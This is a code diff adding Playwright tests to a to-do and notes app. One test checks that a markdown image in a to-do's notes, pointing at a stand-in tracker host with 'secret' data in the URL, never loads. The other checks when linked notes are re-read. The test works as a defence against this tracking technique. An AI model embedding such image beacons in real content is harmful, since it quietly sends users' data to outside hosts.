@@ -164,6 +164,39 @@ test.describe('a to-do\'s notes', () => {
     await expect(page.getByTestId('todo-notes-rendered')).toHaveText('Window seat after all');
   });
 
+  test('a picture in a to-do\'s notes never loads by itself', async ({ authenticatedPage: page }) => {
+    await stubGateway(page);
+    const pixel: string[] = [];
+    await page.route('https://tracker.example/**', (route) => { pixel.push(route.request().url()); return route.fulfill({ status: 200, body: '' }); });
+    await serve(page, { tasks: [T('fly', 'Book flights', { notes: 'See ![x](https://tracker.example/p.png?d=secret)' })] });
+    await page.goto('/tasks?list=all&task=fly');
+    const rendered = page.getByTestId('todo-notes-rendered');
+    await expect(rendered).toContainText('See');
+    await expect(rendered.locator('img')).toHaveCount(0);
+    await page.waitForTimeout(300);
+    expect(pixel).toEqual([]);
+  });
+
+  test('the note reads again only when one of its own to-dos changes', async ({ authenticatedPage: page }) => {
+    const gateway = await stubGateway(page);
+    const s = await serve(page, {
+      notes: [N('plan', 'Trip plan', 'Trip plan\n- [ ] Book flights ^todo-fly12345')],
+      tasks: [T('fly', 'Book flights'), T('other', 'Unrelated')],
+      links: [{ taskId: 'fly', noteId: 'plan', anchor: 'fly12345' }],
+    });
+    await page.goto('/notes?note=plan');
+    await expect(page.locator('.cm-np-todo')).toHaveText('To-do');
+    const reads = () => s.calls.filter((c) => c.method === 'GET' && c.path === '/notes/plan').length;
+    const before = reads();
+    gateway.event('tasks.changed', { taskId: 'other' });
+    await page.waitForTimeout(900);
+    expect(reads()).toBe(before);
+    s.tasks[0].status = 'done';
+    gateway.event('tasks.changed', { taskId: 'fly' });
+    await expect(page.locator('.cm-np-todo')).toHaveText('Done');
+    expect(reads()).toBeGreaterThan(before);
+  });
+
   test('a row says which note a to-do is linked to', async ({ authenticatedPage: page }) => {
     await stubGateway(page);
     await serve(page, {
